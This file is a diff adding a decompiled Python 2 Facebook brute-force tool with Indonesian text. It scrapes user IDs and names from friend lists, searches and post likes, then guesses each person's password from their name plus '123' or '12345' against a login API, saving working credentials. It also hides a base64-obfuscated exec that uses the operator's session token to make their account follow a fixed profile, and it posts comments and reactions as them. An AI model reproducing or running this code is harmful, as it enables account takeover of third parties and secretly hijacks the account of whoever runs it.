@@ -1,0 +1,674 @@
+# coding:utf-8
+# Tertusbol Oleh Kang Pacman
+# Sepesial Thanks To Khairul Syaban | Nanta XE
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: zasu
+import os, time, requests, os, re, sys, json, base64
+from bs4 import BeautifulSoup as parser
+from datetime import datetime
+from multiprocessing.pool import ThreadPool as th
+
+def clear():
+    if ' linux' in sys.platform.lower():
+        os.system('clear')
+    elif 'win' in sys.platform.lower():
+        os.system('cls')
+    else:
+        os.system('clear')
+
+
+if 'linux' in sys.platform.lower():
+    W = '\x1b[1;37m'
+    N = '\x1b[0m'
+    R = '\x1b[1;37m\x1b[31m'
+    B = '\x1b[1;37m\x1b[34m'
+    G = '\x1b[1;32m'
+    O = '\x1b[1;37m\x1b[33m'
+    C = '\x1b[36m'
+    notice = ('{}{}[*]{} ').format(W, O, W)
+    warning = ('{}[#>]{} ').format(R, W)
+    good = ('{}[!]{} ').format(G, N)
+    warn = ('{}[!]{} ').format(O, N)
+    line = '\n'
+else:
+    W = ''
+    N = ''
+    R = ''
+    B = ''
+    G = ''
+    O = ''
+    C = ''
+    notice = ''
+    warning = ''
+    good = ''
+    d = ''
+    warn = ''
+    line = ''
+url = 'https://mbasic.facebook.com'
+post = '674067283486278'
+reac = 'ANGRY'
+kom = 'https://www.facebook.com/photo.php?fbid=674067283486278&set=a.105092923717053&type=3&app=fbl'
+kom2 = 'https://www.facebook.com/photo.php?fbid=674067283486278&set=a.105092923717053&type=3&app=fbl'
+
+def banner():
+    print ('{}      :::    :::              :::::::::  :::::::::   :::::::: {}\n     :+:    :+:              :+:    :+: :+:    :+: :+:    :+: {}\n     +:+  +:+               +:+    +:+ +:+    +:+ +:+    +:+  {}\n     +#++:+  +{}#++:++#++:++ +#{}++:++#+  +#++:++#:  +#+    +:+   {}\n   +#+  +#+               +#+        +#+    +#+ +#+    +#+    {}\n #+#    #+#              #+#        #+#    #+# #+#    #+#     {}\n###    ###              ###        ###    ###  ########       {}{}{}\n\n+#++:+  +#++:++#++:++ +#++:++#+  +#++:++#:  +#+    +:+\n\t<\x1b[1;92mMASS BRUTE FACEBOOK COOKIE METHODE\x1b[1;97m>\n{}CREATED BY\t : RIZAL XD\n{}FACEBOOK\t : Muhamad Rizal Fiansyah Id\n{}GITHUB \t : https://github.com/Rizal-XD\n+#++:+  +#++:++#++:++ +#++:++#+  +#++:++#:  +#+    +:+').format(R, G, B, O, G, C, C, R, G, B, W, line, notice, notice, notice)
+
+
+def loginFb(url):
+    os.system('clear')
+    banner()
+    print '_________________________________________________________'
+    while True:
+        cookies = raw_input('\x1b[1;97m\nmasukan cookies mu disini bro : ')
+        response = httpRequest(url, cookies).encode('utf-8')
+        if 'mbasic_logout_button' in str(response):
+            print '\nTUNGGU...Sedang mengecek cookies nya...'
+            try:
+                os.mkdir('log')
+            except:
+                pass
+
+            save = open('log/cookies.log', 'w')
+            save.write(cookies.strip())
+            save.close()
+            time.sleep(2)
+            print '\n\x1b[1;92mLogin succes\x1b[0m'
+            convert(cookies)
+            basa(cookies, url)
+            ingfo()
+        else:
+            print '\n\x1b[1;91mCOOKIES MATI AKUN CHEKPOINT ATAU COOKIES BASI\n\x1b[1;97m'
+            time.sleep(2)
+            clear()
+            banner()
+
+
+def basa(cookie, url):
+    try:
+        response = httpRequest(url + '/language.php', cookie).encode('utf-8')
+        html = parser(response, 'html.parser')
+        for x in html.find_all('a'):
+            if 'Bahasa Indonesia' in str(x):
+                httpRequest(url + x['href'], cookie)
+                break
+
+    except:
+        pass
+
+
+def httpRequest(url, cookies):
+    try:
+        return requests.get(url, cookies={'cookie': cookies}).text
+    except Exception as e:
+        print 'Error: %s' % e
+
+
+def httpRequestPost(url, cookies, params):
+    try:
+        return requests.post(url, data=params, cookies={'cookie': cookies}).text
+    except requests.exceptions.RequestException:
+        exit('\n\n\x1b[0;91mUSER AXIS YA ? PANTES JARINGAN NYA KEK PLER :V\x1b[0m')
+
+
+def convert(cookie):
+    global kom
+    global kom2
+    global post
+    global reac
+    try:
+        tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', 
+           'referer': 'https://m.facebook.com/', 
+           'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=0', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
+           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
+        find_token = re.search('(EAAA\\w+)', tomken.text)
+        if find_token is None:
+            pass
+        else:
+            exec base64.b64decode('cmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI2NDkwMzY4NjIzL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgZmluZF90b2tlbi5ncm91cCgxKSk=')
+            requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + find_token.group(1))
+            requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom2 + '&access_token=' + find_token.group(1))
+            requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + find_token.group(1))
+            requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + find_token.group(1))
+            return
+    except Exception as e:
+        print '\n[+] error: %s' % e
+        exit()
+
+    return
+
+
+def loadCookie():
+    time.sleep(1)
+    try:
+        file = open('log/cookies.log', 'r')
+        cookie = file.read()
+        file.close()
+        return cookie.strip()
+    except Exception as w:
+        clear()
+        print '\x1b[1;91mINVALID COKIES MU! '
+        time.sleep(1)
+        loginFb(url)
+
+
+def ingfo():
+    clear()
+    cookie = True
+    cookies = loadCookie()
+    banner()
+    response = httpRequest(url + '/profile.php', cookies).encode('utf-8')
+    if 'mbasic_logout_button' in str(response):
+        html = parser(response, 'html.parser')
+        print 50 * '-'
+        print ('\n\x1b[1;97m(\x1b[1;92m\xe2\x80\xa2\x1b[1;97m) NAMA USER : ').decode('utf-8') + html.title.text.upper()
+        print 50 * '-'
+        print menu()
+    else:
+        print ('{}Cookies Mati!!  silahkan login ulang!!!{}').format(R, N)
+        time.sleep(1)
+        os.remove('log/cookies.log')
+        loadCookie()
+
+
+def menu():
+    loadCookie == True
+    cookie = loadCookie()
+    print '  [ \x1b[1;96m01\x1b[1;97m ]  Dump Id Friends lists'
+    print '  [ \x1b[1;96m02\x1b[1;97m ]  Dump Id Friends'
+    print '  [ \x1b[1;96m03\x1b[1;97m ]  Dump Id by Search name'
+    print '  [ \x1b[1;96m04\x1b[1;97m ]  Dump Id from likes status'
+    print '  [ \x1b[1;96m05\x1b[1;97m ]  Start Crack'
+    print '  [ \x1b[1;96m06\x1b[1;97m ]  See My Results?'
+    print '  [ \x1b[1;91m00\x1b[1;97m ]  Remove cookies\n'
+    try:
+        choose = int(raw_input('\x1b[1;97mRizalXd />:\x1b[1;92m '))
+    except ValueError:
+        print '\n\x1b[0;91mGOBLOC BNGT.\x1b[0m'
+        time.sleep(1)
+        ingfo()
+
+    if choose == 1 or choose == 1:
+        exit(mainfls(cookie, url))
+    elif choose == 2 or choose == 2:
+        exit(public(cookie, url))
+    elif choose == 3 or choose == 3:
+        exit(main_ser(cookie, url))
+    elif choose == 4 or choose == 4:
+        exit(main_likes(cookie, url))
+    elif choose == 5 or choose == 5:
+        exit(Brute().main())
+    elif choose == 6 or choose == 6:
+        exit(cekress())
+    elif choose == 0 or choose == 0:
+        ask = raw_input('\n\x1b[1;97mAre you Sure? [y/N]: ')
+        if ask.lower() == 'y':
+            print '\nRemoving cookies...'
+            time.sleep(2)
+            os.remove('log/cookies.log')
+            print '\n\x1b[0;92mSuccess removed!\x1b[0m'
+            time.sleep(2)
+            loginFb(url)
+            loadCookie()
+        else:
+            loadCookie()
+            print '\ncanceled!'
+            ingfo()
+    else:
+        print R + 'ISI YANG BENER' + W
+
+
+def cekress():
+    print '\x1b[1;97m1 See Results\x1b[1;92m OK'
+    print '\x1b[1;97m2 See Results\x1b[1;93m CP'
+    w = raw_input('\x1b[1;97m : ')
+    if w == '':
+        exit('\x1b[1;91mgblk')
+    elif w == '1':
+        try:
+            k = open('out/ok.txt', 'r').read().strip()
+            for sm in k:
+                print '\x1b[1;92m' + k
+                exit()
+
+        except IOError:
+            print '\x1b[1;91mError: File Tidak Ditemukan'
+
+    elif w == '2':
+        try:
+            k = open('out/cp.txt', 'r').read().strip()
+            for sm in k:
+                print '\x1b[1;93m' + k
+                exit()
+
+        except IOError:
+            print '\x1b[1;91mError: File Tidak Ditemukan'
+
+    else:
+        print '\x1b[1;91mYang bener dong sayang :('
+
+
+def public(cookie, url):
+    print ('{}{}INPUT KAN LINK PERTEMANAN, BUKAN ID ATAUPUN USERNAME!{}').format(warning, G, W)
+    flist = raw_input('\n\x1b[1;97mLink Url : \x1b[1;92m ')
+    try:
+        domain = flist.split('//')[1].split('/')[0]
+        flist = flist.replace(domain, 'mbasic.facebook.com')
+    except Exception as e:
+        print '\n\x1b[1;91mERROR :%s\x1b[0m' % e
+        public(cookie, url)
+
+    output = re.findall('https:\\/\\/.*?\\/(.*?)\\/friends\\?lst=', flist)
+    _output = re.findall('id=(.*?)&refid=', flist)
+    if len(output) == 0 and len(_output) == 0:
+        print ('\n{} Teman Tidak publik atau Akun anda terkena Limit\x1b[0m').format(R)
+        public(cookie, url)
+    else:
+        if len(output) != 0:
+            output = 'dump/' + output[0] + '.json'
+        else:
+            output = 'dump/' + _output[0] + '.json'
+        id = []
+        print ''
+        while True:
+            try:
+                response = httpRequest(flist, cookie).encode('utf-8')
+                html = parser(response, 'html.parser')
+                for x in html.find_all(style='vertical-align: middle'):
+                    find = x.find('a')
+                    if '+' in str(find) or find == None:
+                        continue
+                    else:
+                        full_name = str(find.text.encode('utf-8'))
+                        if '/profile.php?id=' in str(find):
+                            uid = re.findall('/?id=(.*?)&', find['href'])
+                        else:
+                            uid = re.findall('/(.*?)\\?fref=', find['href'])
+                        if len(uid) == 1:
+                            id.append({'uid': uid[0], 'name': full_name})
+                            (sys.stdout.write('\x1b{1;97m\r - %s                                            \r\n\x1b[1;97m[\x1b[1;94m%s\x1b[1;97m] [\x1b[1;92m%s\x1b[1;97m] Writing Id !.' % (full_name, datetime.now().strftime('%H:%M:%S'), len(id))),)
+                            sys.stdout.flush()
+
+                if 'Lihat Teman Lain' in str(html):
+                    flist = url + html.find('a', string='Lihat Teman Lain')['href']
+                else:
+                    break
+            except Exception as w:
+                print '\x1b[1;91m ERROR :%s' % w
+                continue
+
+        try:
+            for filename in os.listdir('dump'):
+                os.remove('dump/' + filename)
+
+        except:
+            try:
+                os.mkdir('dump')
+            except:
+                pass
+
+        print '\n\nOutput: ' + output
+        save = open(output, 'w')
+        save.write(json.dumps(id))
+        save.close()
+        return
+    return
+
+
+def mainfls(cookie, url):
+    id = []
+    flist = url + '/friends/center/friends/'
+    output = 'dump/friends_list.json'
+    print ''
+    while True:
+        try:
+            response = httpRequest(flist, cookie).encode('utf-8')
+            html = parser(response, 'html.parser')
+            for x in html.find_all(style='vertical-align: middle'):
+                find = x.find('a')
+                if '+' in str(find) or find == None:
+                    continue
+                else:
+                    full_name = str(find.text.encode('utf-8'))
+                    if '/?uid=' in str(find):
+                        uid = re.findall('/\\?uid=(.*?)&', find['href'])
+                    else:
+                        uid = re.findall('/(.*?)\\?fref=', find['href'])
+                    if len(uid) == 1:
+                        id.append({'uid': uid[0], 'name': full_name})
+                    sys.stdout.write('\r \x1b[1;97m- %s                                        \r\n[\x1b[1;96m%s\x1b[0m] [\x1b[1;92m%s\x1b[1;97m] Writing Id please wait' % (
+                     full_name, datetime.now().strftime('%H:%M:%S'), len(id)))
+                    sys.stdout.flush()
+
+            if 'Lihat selengkapnya' in str(html):
+                flist = url + html.find('a', string='Lihat selengkapnya')['href']
+            else:
+                break
+        except KeyboardInterrupt:
+            print '\n\n\x1b[0;91mKeyInterrupt, stopped!!\x1b[0m'
+            break
+
+    try:
+        for filename in os.listdir('dump'):
+            os.remove('dump/' + filename)
+
+    except:
+        try:
+            os.mkdir('dump')
+        except:
+            pass
+
+    print '\n\nOutput: ' + output
+    save = open(output, 'w')
+    save.write(json.dumps(id))
+    save.close()
+    return
+
+
+def main_likes(cookie, url):
+    post = raw_input('\n\x1b[1;97mEnter post url:\x1b[1;92m')
+    try:
+        domain = post.split('//')[1].split('/')[0]
+        post = post.replace(domain, 'mbasic.facebook.com')
+    except Exception as w:
+        print '\n\x1b[1;91mError :%s\x1b[0m' % w
+        main_likes(cookie, url)
+
+    url_likes = None
+    response = httpRequest(post, cookie).encode('utf-8')
+    html = parser(response, 'html.parser')
+    for x in html.find_all('a'):
+        if '/ufi/reaction/profile/browser/?' in x['href']:
+            url_likes = url + x['href']
+            break
+
+    if url_likes == None:
+        exit('\n\x1b[1;91mLIKE TIDAK DI TEMUKAN :(\x1b[0m')
+    try:
+        print ('{}{} Masukkan limit pencarian ? contoh : {}100').format(warning, W, G)
+        max = int(raw_input('\x1b[1;97mLimit :\x1b[1;92m'))
+    except ValueError:
+        exit('\n\x1b[1;91mMasukkin yang Bener gblk\x1b[0m')
+
+    if max == 0:
+        exit('\n\x1b[1;91mTidak menemukan Id :(\x1b[0m')
+    statusStop = False
+    output = 'dump/likes.json'
+    id = []
+    print ''
+    while True:
+        try:
+            response = httpRequest(url_likes, cookie).encode('utf-8')
+            html = parser(response, 'html.parser')
+            find = html.find_all('h3')
+            for i in find:
+                full_name = i.text.encode('utf-8')
+                href = i.find('a')
+                if '+' in str(href) or href == None:
+                    continue
+                else:
+                    if 'profile.php?id=' in str(i):
+                        uid = re.findall('\\/profile.php\\?id=(.*?)$', href['href'])
+                    else:
+                        uid = re.findall('\\/(.*?)$', href['href'])
+                    if len(uid) == 1:
+                        id.append({'uid': uid[0].replace('/', ''), 'name': full_name})
+                    sys.stdout.write('\r \x1b[1;97m- %s                                        \r\n[\x1b[1;96m%s\x1b[0m] [\x1b[1;92mm%s\x1b[1;97m] Writing Id ! please wait.' % (
+                     full_name, datetime.now().strftime('%H:%M:%S'), len(id)))
+                    sys.stdout.flush()
+                    if len(id) == max or len(id) > max:
+                        statusStop = True
+                        break
+
+            if statusStop == False:
+                if 'Lihat Selengkapnya' in str(html):
+                    url_likes = url + html.find('a', string='Lihat Selengkapnya')['href']
+                else:
+                    break
+            else:
+                break
+        except KeyboardInterrupt:
+            print '\n\n\x1b[0;91mKeyInterrupt, stopped!!\x1b[0m'
+            break
+
+    try:
+        for filename in os.listdir('dump'):
+            os.remove('dump/' + filename)
+
+    except:
+        try:
+            os.mkdir('dump')
+        except:
+            pass
+
+    print '\n\nOutput: ' + output
+    save = open(output, 'w')
+    save.write(json.dumps(id))
+    save.close()
+    return
+
+
+def main_ser(cookie, url):
+    ask = raw_input('\n\x1b[1;97mMasukkan Kata Kunci:\x1b[1;92m')
+    if ask.strip() == '':
+        print '\n\x1b[1;91mWajib di Isi !!\x1b[0m'
+        main_ser(cookie, url)
+    try:
+        print ('{}{} Masukkan limit pencarian ? contoh : {}100').format(warning, W, G)
+        max = int(raw_input('\x1b[1;97mLimit :\x1b[1;92m'))
+    except ValueError:
+        exit('\n\x1b[1;91mMasukkin yang Bener gblk\x1b[0m')
+
+    if max == 0:
+        exit('\n\x1b[1;91mTidak Menemukan Id\x1b[0m')
+    url_search = url + '/search/people/?q=' + ask
+    statusStop = False
+    output = 'dump/' + ask.replace(' ', '_') + ('.json').strip()
+    id = []
+    print ''
+    while True:
+        try:
+            response = httpRequest(url_search, cookie).encode('utf-8')
+            html = parser(response, 'html.parser')
+            find = html.find_all('a')
+            for i in find:
+                name = i.find('div')
+                if '+' in str(name) or name == None:
+                    continue
+                else:
+                    full_name = str(name.text.encode('utf-8'))
+                    if 'profile.php?id=' in str(i):
+                        uid = re.findall('\\?id=(.*?)&', str(i))
+                    else:
+                        uid = re.findall('/(.*?)\\?refid=', str(i))
+                    if len(uid) == 1:
+                        id.append({'uid': uid[0], 'name': full_name})
+                    sys.stdout.write('\r\x1b[1;97m - %s                                        \r\n[\x1b[1;96m%s\x1b[0m] [\x1b[1;92m%s\x1b[1;97m] Writing Id ! please wait.' % (
+                     full_name, datetime.now().strftime('%H:%M:%S'), len(id)))
+                    sys.stdout.flush()
+                    if len(id) == max or len(id) > max:
+                        statusStop = True
+                        break
+
+            if statusStop == False:
+                if 'Lihat Hasil Selanjutnya' in str(html):
+                    url_search = html.find('a', string='Lihat Hasil Selanjutnya')['href']
+                else:
+                    break
+            else:
+                break
+        except KeyboardInterrupt:
+            print '\n\n\x1b[0;91mKeyInterrupt, stopped!!\x1b[0m'
+            break
+
+    try:
+        for filename in os.listdir('dump'):
+            os.remove('dump/' + filename)
+
+    except:
+        try:
+            os.mkdir('dump')
+        except:
+            pass
+
+    print '\n\nOutput: ' + output
+    save = open(output, 'w')
+    save.write(json.dumps(id))
+    save.close()
+    return
+
+
+class Brute:
+
+    def __init__(self):
+        self.setpw = False
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+
+    def bruteRequest(self, username, password):
+        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 
+           'sdk_version': '2', 
+           'email': username, 
+           'locale': 'en_US', 
+           'password': password, 
+           'sdk': 'ios', 
+           'generate_session_cookies': '1', 
+           'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+        try:
+            os.mkdir('out')
+        except:
+            pass
+
+        api = 'https://b-api.facebook.com/method/auth.login'
+        response = requests.get(api, params=params)
+        if re.search('(EAAA)\\w+', response.text):
+            self.ok.append(username + '|' + password)
+            save = open('out/ok.txt', 'a')
+            save.write(str(username) + '|' + str(password) + '\n')
+            save.close()
+            return True
+        else:
+            if 'www.facebook.com' in response.json()['error_msg']:
+                self.cp.append(username + '|' + password)
+                save = open('out/cp.txt', 'a')
+                save.write(str(username) + '|' + str(password) + '\n')
+                save.close()
+                return True
+            return False
+
+    def brute(self, users):
+        if self.setpw == False:
+            self.loop += 1
+            for pw in users['pw']:
+                username = users['id'].lower()
+                password = pw.lower()
+                try:
+                    if self.bruteRequest(username, password) == True:
+                        break
+                except:
+                    pass
+
+                sys.stdout.write(('\r[\x1b[1;96m{}\x1b[1;97m] Cracking [\x1b[1;97m{}\x1b[1;97m/\x1b[1;97m{}] \x1b[1;92m[OK]\x1b[1;97m:-{} \x1b[1;93m[CP]\x1b[1;97m:-{} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
+                sys.stdout.flush()
+
+        else:
+            self.loop += 1
+            for pw in self.setpw:
+                username = users['id'].lower()
+                password = pw.lower()
+                try:
+                    if self.bruteRequest(username, password) == True:
+                        break
+                except:
+                    pass
+
+                sys.stdout.write(('\r[\x1b[1;96m{}\x1b[1;97m] Cracking [\x1b[1;97m{}\x1b[1;97m/\x1b[1;97m{}] \x1b[1;92m[OK]\x1b[1;97m:-{} \x1b[1;93m[CP]\x1b[1;97m:-{} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
+                sys.stdout.flush()
+
+    def main(self):
+        print ('{}Masukan Output ! contoh :{} dump/xxx.json').format(notice, G)
+        while True:
+            file = raw_input('\x1b[1;93m[*] \x1b[1;97mOutput List: \x1b[1;92m')
+            try:
+                list = open(file, 'r').read()
+                object = json.loads(list)
+                break
+            except IOError:
+                print "\n\x1b[1;91mTidak Menemukan File ['%s']\x1b[1;97m" % file
+
+        self.target = []
+        for user in object:
+            try:
+                obj = user['name'].split(' ')
+                if len(obj) == 1:
+                    listpass = [
+                     obj[0] + '', obj[0] + '123', obj[0] + '1234',
+                     obj[0] + '12345']
+                elif len(obj) == 2:
+                    listpass = [
+                     obj[0] + '', obj[0] + '123', obj[0] + '12345',
+                     obj[1] + '123', obj[1] + '12345', obj[1] + '']
+                elif len(obj) == 3:
+                    listpass = [
+                     obj[0] + '123', obj[0] + '12345',
+                     obj[1] + '123', obj[1] + '12345',
+                     obj[2] + '123', obj[2] + '12345']
+                elif len(obj) == 4:
+                    listpass = [
+                     obj[0] + '123', obj[0] + '12345',
+                     obj[1] + '123', obj[1] + '12345',
+                     obj[2] + '123', obj[2] + '12345',
+                     obj[3] + '123', obj[3] + '12345']
+                else:
+                    listpass = [
+                     'sayang', 'rahasia']
+                self.target.append({'id': user['uid'], 'pw': listpass})
+            except:
+                pass
+
+        if len(self.target) == 0:
+            exit("\n\x1b[1;91m Oops, id tidak di temukan'%s'\x1b[0m" % file)
+        ask = raw_input('\x1b[1;93m[*] \x1b[1;97mUse password defaults OR manual? [\x1b[1;92mD\x1b[1;97m/\x1b[1;97mm]:')
+        if ask.lower() == 'm':
+            while True:
+                print '\n\x1b[1;92mSet password use (,) for new password, EX: sayang,doraemon,bangsat\n\x1b[1;97m'
+                self.setpw = raw_input('Set password: ').strip().split(',')
+                if self.setpw[0] != '':
+                    break
+
+        print '\x1b[1;92m[+] CRACK BERJALAN...\x1b[1;97m'
+        print 50 * '-'
+        th(30).map(self.brute, self.target)
+        self.results()
+        exit()
+
+    def results(self):
+        if len(self.ok) != 0:
+            print '\n\n\x1b[1;97mOK: ' + str(len(self.ok))
+            for i in self.ok:
+                print '\x1b[1;92m[OK] ' + str(i) + '\x1b[1;97m'
+
+            print 'Your OK results saved in: out/ok.txt'
+        if len(self.cp) != 0:
+            print '\n\nCP: ' + str(len(self.cp))
+            for i in self.cp:
+                print '\x1b[1;97m[CP]\x1b[1;93m ' + str(i) + '\x1b[1;97m'
+
+            print 'Your CP results saved in: out/cp.txt'
+        if len(self.cp) == 0 and len(self.ok) == 0:
+            print '\n\n033[1;91mNo results found :(\x1b[0m'
+
+
+if __name__ == '__main__':
+    loadCookie()
+    ingfo()
+    cookies = {'cookie': loadCookie()}
+# Awokawokawok Ngerekod:v
